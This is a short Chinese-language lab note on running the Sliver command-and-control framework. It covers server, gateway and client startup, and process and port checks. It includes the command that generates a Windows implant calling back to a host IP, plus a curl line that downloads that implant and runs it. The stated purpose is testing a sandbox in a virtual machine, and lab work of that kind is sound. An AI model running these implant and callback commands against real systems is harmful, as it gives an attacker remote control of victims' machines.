__终端 1 - 启动 Sliver 服务端：__
.\sliver-server.exe daemon --lhost 127.0.0.1 --lport 31337

__终端 2 - 启动 REST API 网关：__
C:\python\python.exe rest_api_gateway.py

__浏览器打开__：http://127.0.0.1:5000/

__ 终端 3 __  启动 Sliver 客户端：
.\sliver-client.exe console

### 文件传输方式建议：
由于是 Linux 虚拟机，推荐用 __Python HTTP 服务器__ 方式传输
__宿主机（开服务）：__
```powershell
python -m http.server 9999
```
__Ubuntu 虚拟机（下载）：__
```bash
curl.exe -O http://10.110.176.103:9999/vm-windows-test.exe
.\vm-windows-test
```


# 杀掉现有服务端进程：
taskkill /F /PID 29044
检查服务端是否正常运行：
1.查看系统中是否有 `sliver-server.exe` 这个进程在运行：
     tasklist /FI "IMAGENAME eq sliver-server.exe" /FO LIST
2.查看 31337 端口是否被某个程序监听（31337 是 Sliver 服务端的默认通信端口）：
     netstat -ano | findstr "31337"

客户端可执行操作：
# 查看生成的 Implant（生成的木马需要在测试机运行 才能建立会话 有会话才能测试沙箱）
sliver > implants
# 查看在线会话
sliver > sessions
# 查看服务器状态
sliver > info
#查看HTTP监听器：
sliver > jobs

# 要把生成的 Implant 复制到 VMware 虚拟机并运行，步骤如下：
第一步：查看宿主机 IP 地址
找到你的局域网 IP:10.110.176.103
第二步：重新生成植入物（关键！）
回到 Sliver 客户端，用宿主机的 IP 重新生成一个植入物：
generate --http 10.110.176.103:7777 --os windows --arch amd64 --name vm-windows-test
生成后的文件格式：
Windows 生成的是 .exe 文件
Linux 生成的是无后缀的 ELF 可执行文件（就是 vm-test，没有 .exe）
